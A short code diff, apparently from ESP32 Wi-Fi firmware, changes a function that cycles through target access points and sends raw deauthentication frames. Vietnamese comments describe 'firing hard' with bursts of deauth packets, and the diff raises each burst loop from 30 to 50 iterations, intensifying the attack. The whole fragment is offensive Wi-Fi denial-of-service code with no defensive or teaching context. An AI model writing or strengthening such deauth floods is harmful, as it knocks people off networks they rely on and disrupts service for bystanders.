@@ -1127,7 +1127,7 @@ void execute_multi_bruce_style(const std::vector<wifi_ap_record_t>& targets) {
             vTaskDelay(pdMS_TO_TICKS(5));
 
             // BẮN RÁT: 30 đợt liên tục (tương đương 90 gói deauth / 1 lần ghé thăm)
-            for (int i = 0; i < 30; i++) {
+            for (int i = 0; i < 50; i++) {
                 send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                 
                 // Check nút bấm cực nhanh
